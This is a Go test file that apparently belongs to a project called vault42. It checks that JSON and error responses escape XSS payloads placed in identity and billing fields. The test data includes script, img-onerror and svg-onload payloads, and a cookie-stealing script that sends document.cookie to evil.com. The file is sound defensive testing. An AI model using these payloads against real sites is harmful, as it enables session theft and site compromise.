package attack

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/42-v/vault42/internal/handler"
)

// TestIdentityXSS_JSONEscapesHTMLPayloads verifies that when identity data
// containing HTML/XSS payloads is returned via WriteJSON, the payloads are
// properly escaped in the JSON output and cannot execute as raw HTML.
//
// Go's encoding/json encoder escapes <, >, and & by default in JSON strings,
// producing \u003c, \u003e, \u0026. This prevents reflected XSS even if the
// JSON is accidentally rendered as HTML.
func TestIdentityXSS_JSONEscapesHTMLPayloads(t *testing.T) {
	xssPayloads := []struct {
		name    string
		input   string
		rawTags []string // raw HTML tags that must NOT appear unescaped
	}{
		{
			name:    "script_tag",
			input:   `<script>alert('xss')</script>`,
			rawTags: []string{"<script>", "</script>"},
		},
		{
			name:    "img_onerror",
			input:   `<img src=x onerror=alert(1)>`,
			rawTags: []string{"<img"},
		},
		{
			name:    "svg_onload",
			input:   `"><svg onload=alert(1)>`,
			rawTags: []string{"<svg"},
		},
		{
			name:    "iframe_injection",
			input:   `<iframe src="https://evil.com"></iframe>`,
			rawTags: []string{"<iframe"},
		},
		{
			name:    "event_handler",
			input:   `" onmouseover="alert(document.cookie)"`,
			rawTags: []string{}, // no HTML tags, but verify JSON escaping of quotes
		},
		{
			name:    "nested_script",
			input:   `<scr<script>ipt>alert(1)</scr</script>ipt>`,
			rawTags: []string{"<script>"},
		},
		{
			name:    "null_byte_bypass",
			input:   "<scri\x00pt>alert(1)</script>",
			rawTags: []string{"<script>"},
		},
		{
			name:    "html_entity_double_encode",
			input:   `&lt;script&gt;alert(1)&lt;/script&gt;`,
			rawTags: []string{}, // already encoded, verify no re-decoding
		},
	}

	for _, tc := range xssPayloads {
		t.Run(tc.name, func(t *testing.T) {
			// Create a response with the XSS payload in identity fields
			data := map[string]interface{}{
				"given_name":  tc.input,
				"family_name": tc.input,
				"country":     "US",
				"sex":         tc.input,
			}

			rec := httptest.NewRecorder()
			handler.WriteJSON(rec, http.StatusOK, data)

			body := rec.Body.String()

			// Check Content-Type is application/json (not text/html)
			ct := rec.Header().Get("Content-Type")
			if !strings.Contains(ct, "application/json") {
				t.Fatalf("Expected Content-Type application/json, got %q", ct)
			}

			// Verify raw HTML tags are NOT present in the response body.
			// Go's json.Encoder escapes < as \u003c and > as \u003e by default.
			for _, tag := range tc.rawTags {
				if strings.Contains(body, tag) {
					t.Fatalf("Response body contains raw HTML tag %q — XSS vulnerability.\nBody: %s", tag, body)
				}
			}

			// Verify the response is valid JSON
			var decoded map[string]interface{}
			if err := json.Unmarshal([]byte(body), &decoded); err != nil {
				t.Fatalf("Response is not valid JSON: %v\nBody: %s", err, body)
			}

			// Verify the decoded value preserves the original input
			// (the data is there, just safely escaped in JSON transport)
			if given, ok := decoded["given_name"].(string); ok {
				if given != tc.input {
					t.Fatalf("Decoded given_name mismatch.\nExpected: %q\nGot: %q", tc.input, given)
				}
			}
		})
	}
}

// TestIdentityXSS_ErrorResponsesEscaped verifies that error responses also
// properly escape any user-controlled input that might appear in error messages.
func TestIdentityXSS_ErrorResponsesEscaped(t *testing.T) {
	// Test that WriteError produces safe JSON output
	errorCodes := []string{
		"invalid_request",
		"<script>alert(1)</script>",
		"unauthorized\"><img src=x>",
	}

	for _, code := range errorCodes {
		t.Run(code[:min(len(code), 20)], func(t *testing.T) {
			rec := httptest.NewRecorder()
			handler.WriteError(rec, http.StatusBadRequest, code)

			body := rec.Body.String()

			// Content-Type must be application/json
			ct := rec.Header().Get("Content-Type")
			if !strings.Contains(ct, "application/json") {
				t.Fatalf("Expected application/json, got %q", ct)
			}

			// No raw HTML tags in the response
			if strings.Contains(body, "<script>") {
				t.Fatalf("Error response contains raw <script> tag: %s", body)
			}
			if strings.Contains(body, "<img") {
				t.Fatalf("Error response contains raw <img tag: %s", body)
			}

			// Must be valid JSON
			var decoded map[string]interface{}
			if err := json.Unmarshal([]byte(body), &decoded); err != nil {
				t.Fatalf("Error response is not valid JSON: %v", err)
			}
		})
	}
}

// TestIdentityXSS_BillingFieldsEscaped verifies that billing address fields
// with XSS payloads are also safely escaped in JSON responses.
func TestIdentityXSS_BillingFieldsEscaped(t *testing.T) {
	xss := `<script>document.location='https://evil.com/?c='+document.cookie</script>`

	data := map[string]interface{}{
		"given_name":  "John",
		"family_name": "Doe",
		"billing": map[string]interface{}{
			"address_line_1": xss,
			"address_line_2": xss,
			"city":           xss,
			"postal_code":    xss,
			"vat_id":         xss,
		},
	}

	rec := httptest.NewRecorder()
	handler.WriteJSON(rec, http.StatusOK, data)

	body := rec.Body.String()

	if strings.Contains(body, "<script>") {
		t.Fatalf("Billing fields contain raw <script> tag — XSS vulnerability.\nBody: %s", body)
	}

	// Verify billing data survives JSON round-trip
	var decoded map[string]interface{}
	if err := json.Unmarshal([]byte(body), &decoded); err != nil {
		t.Fatalf("Response is not valid JSON: %v", err)
	}

	billing, ok := decoded["billing"].(map[string]interface{})
	if !ok {
		t.Fatal("Billing field missing or wrong type in response")
	}

	if billing["address_line_1"] != xss {
		t.Fatalf("Billing address_line_1 data corrupted after JSON round-trip.\nExpected: %q\nGot: %q",
			xss, billing["address_line_1"])
	}
}

// TestIdentityXSS_UnicodeEscapeSequences verifies that Unicode-based XSS
// bypass attempts are handled correctly by JSON encoding.
func TestIdentityXSS_UnicodeEscapeSequences(t *testing.T) {
	// Various Unicode XSS bypass attempts
	payloads := []string{
		"\u003cscript\u003ealert(1)\u003c/script\u003e",         // pre-escaped
		"\xff\xfe<\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00",      // UTF-16 BOM
		"<script>alert(String.fromCharCode(88,83,83))</script>", // charcode obfuscation
		"\u0000<script>alert(1)</script>",                       // null prefix
	}

	for i, payload := range payloads {
		t.Run(strings.ReplaceAll(payload[:min(len(payload), 15)], "\x00", "\\0"), func(t *testing.T) {
			data := map[string]string{"field": payload}
			rec := httptest.NewRecorder()
			handler.WriteJSON(rec, http.StatusOK, data)

			body := rec.Body.String()

			// The raw HTML <script> tag should never appear in the JSON output
			if strings.Contains(body, "<script>") {
				t.Fatalf("Payload %d contains raw <script> in JSON output: %s", i, body)
			}

			// Must be valid JSON
			var decoded map[string]string
			if err := json.Unmarshal([]byte(body), &decoded); err != nil {
				t.Fatalf("Payload %d produced invalid JSON: %v", i, err)
			}
		})
	}
}

// TestIdentityXSS_ContentTypeNotOverridable verifies that the Content-Type
// header is always set to application/json by WriteJSON, regardless of what
// was previously set. This prevents a confused deputy attack where an upstream
// proxy might set text/html.
func TestIdentityXSS_ContentTypeNotOverridable(t *testing.T) {
	rec := httptest.NewRecorder()
	// Pre-set a wrong Content-Type (simulating proxy interference)
	rec.Header().Set("Content-Type", "text/html")

	handler.WriteJSON(rec, http.StatusOK, map[string]string{"test": "value"})

	ct := rec.Header().Get("Content-Type")
	if strings.Contains(ct, "text/html") {
		t.Fatalf("Content-Type should be overwritten to application/json, got %q", ct)
	}
	if !strings.Contains(ct, "application/json") {
		t.Fatalf("Expected application/json, got %q", ct)
	}
}
